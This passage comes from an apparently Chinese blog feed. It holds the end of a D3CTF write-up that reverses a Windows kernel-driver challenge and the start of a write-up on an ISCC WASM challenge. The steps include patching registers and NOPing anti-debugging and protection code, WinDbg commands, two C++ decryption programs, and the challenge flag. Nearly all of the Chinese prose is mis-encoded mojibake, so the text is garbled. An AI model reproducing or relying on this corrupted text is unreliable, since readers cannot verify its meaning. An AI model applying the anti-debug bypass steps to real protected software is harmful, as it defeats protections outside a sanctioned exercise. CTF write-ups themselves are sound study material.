text"></p><p>å‘ç°è¿™è¾¹æœ‰ä¸ªåè°ƒè¯•ï¼Œç„¶åèµ°äº†ä¸åŒä»£ç ï¼Œå¦‚æœæ£€æµ‹åˆ°è¢«è°ƒè¯•ï¼Œå°±èµ°æˆ‘ä»¬ä¸Šé¢åˆ†æçš„é‚£ä¸ªçº¯r3çš„äº¤äº’ï¼Œå¦‚æœæ²¡æœ‰è¢«æ£€æµ‹åˆ°ï¼Œå°±èµ°çœŸå®çš„R0é€šä¿¡äº¤äº’ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-37.png" alt="alt text"></p><p>è¦æƒ³è°ƒè¯•çœŸå®çš„ä»£ç éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±è¦åœ¨åè°ƒè¯•å’Œæ£€æµ‹é©±åŠ¨handleçš„åœ°æ–¹åšä¸€ä¸‹å¤„ç†ï¼Œå› ä¸ºæˆ‘ä»¬ç›®å‰è¿˜æ²¡æœ‰è¿è¡Œé©±åŠ¨ï¼Œæ‰¾ä¸åˆ°é©±åŠ¨å¥æŸ„çš„ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-38.png" alt="alt text"></p><p>åè°ƒè¯•è¿™è¾¹ç›´æ¥å°†è¿”å›å€¼raxæ”¹æˆ0å°±å¯ä»¥ç»•è¿‡åè°ƒè¯•ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-39.png" alt="alt text"></p><p>createFileå¤„æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»å‚æ•°å¾—åˆ°â€\\.\d3ctfâ€ï¼Œmov r15,raxå¤„å°†raxæ”¹æˆ1å°±å¯ä»¥ç»•è¿‡è¿™è¾¹çš„åˆæ³•å¥æŸ„æ ¡éªŒã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-40.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-41.png" alt="alt text"></p><p>ç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°è¿™è¾¹æ˜¯è§£å¯†å‡ºä¸€äº›å­—ç¬¦ä¸²ï¼Œç„¶åè¾“å‡ºè¾“å…¥ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-42.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-43.png" alt="alt text"></p><p>ç„¶åå°†nameå’ŒpasswordæŒ‡é’ˆæ”¾åˆ°ä¸€ä¸ªç»“æ„ä½“é‡Œé¢({name,password})ï¼Œé€šä¿¡ä¼ åˆ°R0ï¼Œç„¶åå†é€šä¿¡ä¸€æ¬¡å¾—åˆ°è¿”å›æ•°æ®ï¼Œå†è§£å¯†è¾“å‡ºã€‚æ§åˆ¶ç åˆ†åˆ«æ˜¯0x222000å’Œ0x222004ã€‚åˆ°æ­¤æ•´ä½“R3æµç¨‹åˆ†æå®Œæ¯•ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-44.png" alt="alt text"></p><h2 id="R0åˆ†æ"><a href="#R0åˆ†æ" class="headerlink" title="R0åˆ†æ"></a>R0åˆ†æ</h2><h3 id="ä»£ç æµç¨‹åˆ†æ"><a href="#ä»£ç æµç¨‹åˆ†æ" class="headerlink" title="ä»£ç æµç¨‹åˆ†æ"></a>ä»£ç æµç¨‹åˆ†æ</h3><p>DriverEntryè¿›æ¥ï¼Œå‘ç°å‡½æ•°è¿™è¾¹å­˜åœ¨åè°ƒè¯•æ£€æµ‹ä»¥åŠå¯¹R3ç¨‹åºè¿›ç¨‹ä¿æŠ¤ï¼Œåè°ƒè¯•æ£€æµ‹åˆ°ä¼šç›´æ¥å°†windbgè°ƒè¯•å‰¥ç¦»ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-46.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-47.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-48.png" alt="alt text"></p><p>ç›´æ¥å°†çº¢æ¡†å¤„ä»£ç å…¨éƒ¨nopï¼Œå°±å¯ä»¥å»æ‰æ‰€æœ‰çš„åè°ƒè¯•å’Œä¿æŠ¤äº†ï¼Œä¸»è¦åˆ†æå°±åœ¨è¿™è¾¹çš„MajorFunctionï¼Œsub_1400011A0è¿›è¡Œåˆ†æã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-49.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-50.png" alt="alt text"></p><p>æˆ‘ä»¬ç¡®å®ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œé¢æ‰¾åˆ°ä¸¤ä¸ªæ§åˆ¶ç çš„åˆ¤æ–­å’Œæ‰§è¡Œä»£ç ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-52.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-51.png" alt="alt text"></p><p>åœ¨æ§åˆ¶ç 0x222004ä¸‹é¢ï¼Œæœ‰ä¸¤å¤„æ–‡æœ¬è§£å¯†ï¼Œå¯ä»¥æ¨¡æ‹Ÿä»£ç ï¼Œæ‰‹åŠ¨è§£å¯†å‡ºæ¥ä¸ºè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-55.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-53.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-54.png" alt="alt text"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecText</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *enc, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v45&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> v47&#123;&#125;, v48&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v47 = <span class="number">52</span> * (v45 / <span class="number">52</span>);</span><br><span class="line">        v48 = v45++;</span><br><span class="line">        enc[i] ^= v48 - v47 + <span class="number">55</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004270[<span class="number">29</span>] = &#123;</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x16</span>, <span class="number">0x1B</span>, <span class="number">0x4B</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x2C</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x53</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004290[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0x1C</span>, <span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>&#125;;</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004270, <span class="number">29</span>);</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004290, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.29s\n&quot;</span>, unk_140004270);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, unk_140004290);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥çŸ¥é“è¿™éƒ¨åˆ†å°±æ˜¯å¯¹åŠ å¯†åçš„nameå’Œpasswordè¿›è¡Œæ ¡éªŒï¼Œæ ¡éªŒæˆåŠŸè¾“å‡ºâ€qwq, why!!!!! my secret!!!!!â€ï¼Œæ ¡éªŒå¤±è´¥ï¼Œè·³è½¬åˆ°ä¸‹é¢è¾“å‡ºâ€zako, try againâ€ã€‚</p><p>è¿™éƒ¨åˆ†ä»£ç æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å¤–å±‚æ ¡éªŒäº†28ä¸ªå­—èŠ‚ï¼Œå†…å±‚æ ¡éªŒäº†144ä¸ªå­—èŠ‚ï¼Œåˆ†åˆ«é™¤ä»¥4å°±æ˜¯7å’Œ36ï¼Œåˆ†åˆ«å¯¹åº”ä¸Šäº†r3å±‚çš„nameå’Œpasswordçš„é•¿åº¦ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-56.png" alt="alt text"></p><p>åœ¨ä¸Šé¢ä»£ç éƒ¨åˆ†ä¹Ÿå¯ä»¥çœ‹åˆ°æœ‰passwordå’Œnameçš„æ•°æ®åŠ è½½ï¼Œä¸€ä¸ª36å¾ªç¯ä¸€ä¸ª7å¾ªç¯å°±å¯ä»¥åˆ†è¾¨å‡ºæ¥ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-57.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-58.png" alt="alt text"></p><p>è¿™è¾¹æœ‰è°ƒç”¨åˆ°çš„sub_14000270Cæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºä»£ç ï¼Œç›®å‰ä¸çŸ¥é“æ‰§è¡Œäº†ä»€ä¹ˆã€‚æ¥ä¸‹æ¥å°±å…ˆåœ¨ä¸¤å¤„çš„æ•°æ®åŠ è½½åŠ¨è°ƒåˆ†æå…¥æ‰‹ï¼Œçœ‹çœ‹passwordå’Œnameéƒ½åšäº†ä»€ä¹ˆå¤„ç†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-59.png" alt="alt text"></p><h3 id="åŠ¨è°ƒåˆ†æ"><a href="#åŠ¨è°ƒåˆ†æ" class="headerlink" title="åŠ¨è°ƒåˆ†æ"></a>åŠ¨è°ƒåˆ†æ</h3><p>è¿™è¾¹å®é™…è°ƒè¯•å‘ç°ï¼Œè¿™è¾¹æ‰«æntæ¨¡å—åœ°å€æ—¶å€™ä¼šå¯¼è‡´è“å±ï¼Œæ‰€ä»¥æœ€å¥½åœ¨ç®­å¤´å¤„æ–­ç‚¹ï¼Œæ‰‹åŠ¨èµ‹å€¼ä¸Šntæ¨¡å—åœ°å€ï¼Œd3ctf+0x1CC4ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-60.png" alt="alt text"></p><p>å…ˆç”¨sxe ld d3ctfå‘½ä»¤æ‹¦æˆªæ–­ç‚¹è¯¥é©±åŠ¨çš„åŠ è½½ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-61.png" alt="alt text"></p><p>åŠ è½½é©±åŠ¨æ–­ä¸‹åï¼Œè®¾ç½®d3ctf+0x1CC4çš„æ–­ç‚¹ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-62.png" alt="alt text"></p><p>æ–­ä¸‹ålm vm ntæŸ¥è¯¢ntçš„åœ°å€å¾—åˆ°fffff804&#96;75e00000ï¼Œæ‰‹åŠ¨ç»™d3ctf+0x5400èµ‹å€¼å³å¯ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-63.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-64.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-65.png" alt="alt text"></p><p>åœ¨æˆ‘ä»¬åˆšåˆšè¦åŠ¨è°ƒçš„36å¾ªç¯å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒæˆåŠŸæ–­ä¸‹ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-66.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-67.png" alt="alt text"></p><p>è¿™è¾¹å¯ä»¥å‘ç°è¦ç»™eaxèµ‹å€¼çš„æ•°ç»„å¤„å°±æ˜¯æˆ‘ä»¬r3è¾“å…¥ä¼ è¿›æ¥çš„passwordï¼Œå•æ­¥æ‰§è¡Œå®Œcallï¼Œå¯ä»¥å‘ç°å‚æ•°ä¸€æ˜¯r14èµ‹å€¼ç»™rcxçš„ï¼ŒæŸ¥çœ‹æ‰§è¡Œå®Œå‡½æ•°çš„r14ï¼Œå‘ç°æ˜¯ä¸€ä¸ªä¸¤ä¸ªDWORD64åœ°å€çš„ç»“æ„ä½“ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-68.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-69.png" alt="alt text"></p><p>ç›´æ¥pa d3ctf+0x1596è®©ä»£ç æ‰§è¡Œåˆ°æ­¤å¤„ï¼Œä¹Ÿå°±æ˜¯forå¾ªç¯ç»“æŸåçš„ä»£ç ã€‚</p><p>å†æ¬¡æŸ¥çœ‹r14ç»“æ„çš„ç¬¬äºŒä¸ªåœ°å€ï¼Œå‘ç°è¿™å¾ªç¯å®é™…ä½œç”¨å°±æ˜¯å°†è¾“å…¥çš„36 passwordå­—èŠ‚éƒ½è½¬æ¢æˆDWORDç±»å‹ï¼Œå­˜å…¥åˆ°ä¸€ä¸ªæ•°ç»„ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-70.png" alt="alt text"></p><p>å•æ­¥æ‰§è¡Œå®Œå¾ªç¯ä¸‹é¢çš„ä¸¤ä¸ªVMåï¼Œå‘ç°æ˜¯ç»™è¿™ä¸ªæ•°ç»„å‰é¢åŠ äº†ä¸ª0x24æ•°æ®</p><p><img src="/2025/06/01/D3CTF-Reverse/image-71.png" alt="alt text"></p><p>pa d3ctf+0x19E2ï¼Œè·³åˆ°nameé‚£è¾¹å¾ªç¯èµ‹å€¼çš„å¾ªç¯ç»“æŸåœ°å€ï¼ŒåŒæ ·æŸ¥çœ‹å‚æ•°ä¸€ï¼Œè¿™è¾¹æ˜¯r15ï¼Œå‘ç°æ˜¯å’Œpasswordåˆå§‹æ“ä½œä¸€æ ·ï¼Œå°†è¾“å…¥å­—ç¬¦ä¸²è½¬æˆDWORDæ•°ç»„å­˜å…¥ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-72.png" alt="alt text"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆä¸ç®¡ä¸­é€”å¯¹passwordå’Œnameçš„ä¸€äº›åŠ å¯†æ“ä½œï¼Œç›´æ¥è·³åˆ°Checkå¤„ï¼Œè¿™è¾¹æ˜¯28å­—èŠ‚Checkï¼Œå¯¹åº”nameçš„DWORDé•¿åº¦ã€‚</p><p>pa d3ctf+0x1A99</p><p><img src="/2025/06/01/D3CTF-Reverse/image-73.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-74.png" alt="alt text"></p><p>æŸ¥çœ‹ä¸¤ä¸ªæ•°ç»„çš„æ•°æ®ï¼Œå‘ç°å‰ä¸ƒä¸ªDWORDï¼Œä¹Ÿå°±æ˜¯å‰28å­—èŠ‚æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œè¯´æ˜nameç¡®å®æ˜¯r3å‡æµç¨‹é‚£è¾¹å¾—åˆ°çš„â€mitsuhaâ€ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-75.png" alt="alt text"></p><p>å†pa d3ctf+0x1AC4ï¼Œæ‰§è¡Œåˆ°æ ¡éªŒpasswordçš„åœ°æ–¹ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-77.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-76.png" alt="alt text"></p><p>æŸ¥è¯¢å°†è¦å¯¹æ¯”æ ¡éªŒçš„ä¸¤ä¸ªæ•°ç»„æ•°å€¼ï¼Œä¸Šé¢æ˜¯æˆ‘ä»¬passwordåŠ å¯†åçš„å¯†æ–‡ï¼Œä¸‹é¢æ˜¯ç›®æ ‡å¯†æ–‡ã€‚</p><p>æˆ‘ä»¬è¾“å…¥çš„passwordæ˜¯â€123456abcdef123456abcdef123456abcdefâ€ï¼Œå‘ç°åŠ å¯†åçš„å¯†æ–‡å¾ˆæœ‰è§„å¾‹æ€§å’Œé‡å¤æ€§ï¼ŒçŒœæµ‹æ˜¯ç®€å•åŠ å¯†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-79.png" alt="alt text"></p><p>å¹¶ä¸”å‘ç°ç¬¬ä¸€ä¸ªæ•°æ®0x15 ^ â€˜1â€™ &#x3D; 0x24ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšä¸Šé¢å‡ºç°çš„VMå‡½æ•°ç»™passwordæ•°ç»„æ·»åŠ çš„ç¬¬ä¸€ä¸ª0x24æ•°æ®ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-80.png" alt="alt text"></p><p>å‘ç°ç¬¬ä¸€ä¸ª0x15 ^ 0x24 &#x3D; â€˜1â€™ï¼Œç„¶åâ€™1â€™ ^ 0x3 &#x3D; â€˜2â€™ï¼Œä¾æ¬¡ä¸‹å»ï¼Œå°±è§£å¯†å‡ºæ¥äº†åŸè¾“å…¥çš„passwordã€‚</p><p>è¯´æ˜æ£€éªŒå‰passwordçš„åŠ å¯†å¦‚ä¸‹ï¼šæ’å…¥0x24åˆ°æ•°ç»„å¤´ï¼Œä¾æ¬¡å¾€åä¸¤ä¸¤ç›¸é‚»æ•°å€¼å¼‚æˆ–ã€‚</p><p>é‚£ä¹ˆè¿™è¾¹ç›´æ¥æå–37ä¸ªDWORDçš„å¯†æ–‡ï¼Œè¿›è¡Œä¸¤ä¸¤å¼‚æˆ–è§£å¯†å³å¯ã€‚</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å¯†æ–‡å‰é¢æ’å…¥0x24ç”¨äºè§£å¯†</span></span><br><span class="line">    <span class="type">uint8_t</span> Enc[]&#123;<span class="number">0x24</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0xe</span>, <span class="number">0x5c</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x52</span>, <span class="number">0x6</span>, <span class="number">0x1b</span>, <span class="number">0x1a</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x5e</span>, <span class="number">0x4b</span>, <span class="number">0x19</span>, <span class="number">0x56</span>, <span class="number">0x6</span>, <span class="number">0x55</span>, <span class="number">0x1c</span>, <span class="number">0x14</span>, <span class="number">0x5c</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x50</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0x52</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x6A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Enc[i + <span class="number">1</span>] ^= Enc[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·³è¿‡ç¬¬ä¸€ä¸ª0x24ï¼Œè¾“å‡ºå36 passwordæ˜æ–‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d3ctf&#123;%.36s&#125;\n&quot;</span>, Enc + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>d3ctf{a68dfb06-798f-4bd1-9e81-011aaec113f0}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™æ¬¡æ¯”èµ›åšäº†d3kernelå’Œlocked doorè¿™ä¸¤é¢˜ï¼Œä¹Ÿæ˜¯éƒ½æ‹¿ä¸‹äº†ä¸€è¡€ã€‚è¿™ä¸¤é¢˜éƒ½æ˜¯å¼ºå¯¹æŠ—ç±»å‹ï¼Œå’Œä¼ ç»Ÿçš„åŠ è§£å¯†ç±»å‹é¢˜ç›®æœ‰åŒºåˆ«ã€‚kerne</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ISCCæ“‚å°èµ›é€†å‘é¢˜ Enigma é¢˜è§£</title>
    <link href="https://tkazer.github.io/2025/05/25/ISCC-Enigma/"/>
    <id>https://tkazer.github.io/2025/05/25/ISCC-Enigma/</id>
    <published>2025-05-25T04:56:13.000Z</published>
    <updated>2025-06-01T03:01:15.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™é¢˜å½“æ—¶èµ›ä¸­å¾ˆæ—©å°±å†™å‡ºçˆ†ç ´è§£å¯†è„šæœ¬äº†ï¼Œä½†æ˜¯ä¸€ç›´æ²¡çˆ†å‡ºæ¥ï¼Œèµ›åå’Œå‡ºé¢˜äººå’¨è¯¢å‘ç°æ˜¯å¯†æ–‡é”™äº†ï¼Œå¹¶ä¸”å‘ç°å…¶å®æ˜¯ç¨‹åºæœ¬èº«å‡ºé”™äº†ï¼Œxor 0x10çš„ä»£ç å¹¶æ²¡æœ‰ç»™å®é™…å¯†æ–‡æ•°æ®æ®µè¿›è¡Œxorï¼Œè€Œæ˜¯ç»™ä¸€ä¸ªç©ºæ•°æ®æ®µxoräº†ï¼Œæ‰€ä»¥å¯¼è‡´å¯†æ–‡æ²¡æœ‰xor 0x10ï¼Œæ‰€ä»¥æ˜¯é”™çš„å¯†æ–‡ï¼Œä¹Ÿå°±æ— æ³•çˆ†ç ´ã€‚è¿™é¢˜æœ¬èº«é¢˜ç›®éš¾åº¦è¿˜è¡Œï¼ŒWASMé€†å‘+AESé­”æ”¹+Siphash+æ’åˆ—çˆ†ç ´ã€‚</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="ç¨‹åºæµç¨‹åˆ†æ"><a href="#ç¨‹åºæµç¨‹åˆ†æ" class="headerlink" title="ç¨‹åºæµç¨‹åˆ†æ"></a>ç¨‹åºæµç¨‹åˆ†æ</h2><p>ä¸‹è½½å¾—åˆ°binæ–‡ä»¶ï¼Œxor 0x21å¾—åˆ°wasmç¨‹åºæ–‡ä»¶ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image.png" alt="alt text"></p><p>è¿™è¾¹ä½¿ç”¨ghidraåˆ†æï¼Œghidraæ’ä»¶é“¾æ¥ï¼š<a href="https://github.com/nneonneo/ghidra-wasm-plugin">https://github.com/nneonneo/ghidra-wasm-plugin</a></p><p>ä»å¯¼å‡ºè¡¨å®šä½åˆ°mainå‡½æ•°ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-1.png" alt="alt text"></p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼Œå…ˆè¾“å…¥å­—ç¬¦ä¸²ï¼Œç„¶åsrand(time(0))ï¼Œå–16ä¸ªrand()%2ï¼Œå­˜åˆ°b70æ•°ç»„ï¼Œæ‰€ä»¥b70æ˜¯0101çš„éšæœºæ’åˆ—æ•°ç»„ï¼Œè¿™è¾¹çš„éœ€è¦çš„çˆ†ç ´æ¬¡æ•°å°±æ˜¯2^16ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-2.png" alt="alt text"></p><p>è¿™è¾¹æä¸€å˜´srandå’Œrandçš„å®ç°ï¼Œè¿™æ ·çš„å®ç°å°±æ˜¯å¯¹åº”Cè¯­è¨€ä¸­çš„srandå’Œrandï¼Œé­”æ•°ä¹Ÿæ˜¯å¾ˆå¥½çœ‹å‡ºæ¥çš„ï¼Œè¿™è¾¹ä»£ç æŠ„å‡ºæ¥å°±å¯ä»¥ç”¨ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-3.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-4.png" alt="alt text"></p><p>ç¬¬äºŒéƒ¨åˆ†æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²å–äº†ä¸€éƒ¨åˆ†ï¼Œç„¶åå°†b70æ•°ç»„å½“ä½œå¯†é’¥ï¼Œè¿›è¡ŒSipHashï¼Œå¾—åˆ°hashå€¼ç„¶åæ‰©å±•æˆ16å­—èŠ‚çš„å¯†é’¥ï¼Œè¿™è¾¹å¯¹è¾“å…¥å­—ç¬¦ä¸²çš„æ“ä½œæœ‰ç‚¹è¿·æƒ‘çœ‹ä¸æ‡‚ï¼Œå°±å¾—å¼€å§‹åŠ¨è°ƒçœ‹çœ‹å®é™…æ€ä¹ˆå–çš„ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-5.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-12.png" alt="alt text"></p><p>è¿™è¾¹ä½¿ç”¨çš„æ˜¯TGCTFçš„indexé¢˜çš„wasmç¯å¢ƒï¼Œåªæ˜¯æŠŠé‡Œé¢çš„wasmè°ƒç”¨æ”¹æˆè¿™é¢˜çš„wasmã€‚</p><p>è¾“å…¥48é•¿åº¦å­—ç¬¦ä¸²ï¼Œç„¶åç‚¹ç¡®å®šå†ç‚¹ä¸€ä¸‹å–æ¶ˆï¼Œæ–­ç‚¹åˆ°wasmç¨‹åºï¼Œfunc13å°±æ˜¯mainå‡½æ•°è¿™è¾¹ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-6.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-7.png" alt="alt text"></p><p>è¿™è¾¹è°ƒç”¨çš„func12å°±æ˜¯å¯¹åº”SpiHashçš„callã€‚ç„¶åå †æ ˆçš„ä¸‰ä¸ªå€¼å°±å¯¹åº”SpiHashçš„ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¦çœ‹çš„ä¼ å…¥å­—ç¬¦ä¸²å‚æ•°ã€‚</p><p>å°†å€¼è½¬åˆ°åå…­è¿›åˆ¶ï¼Œç‚¹å‡»ç®­å¤´å¤„çš„MemoryæŒ‰é’®ï¼Œåœ¨Memoryçª—å£è½¬åˆ°å¯¹åº”çš„åœ°å€ï¼Œå‘ç°æ˜¯ä¼ å…¥æ˜¯ISCC{123}ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å‰å…«ä¸ªå­—ç¬¦åŠ æœ€åä¸€ä¸ª}ã€‚</p><p><img src="/2025/05/25/ISCC-Enigma/image-8.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-9.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-10.png" alt="alt 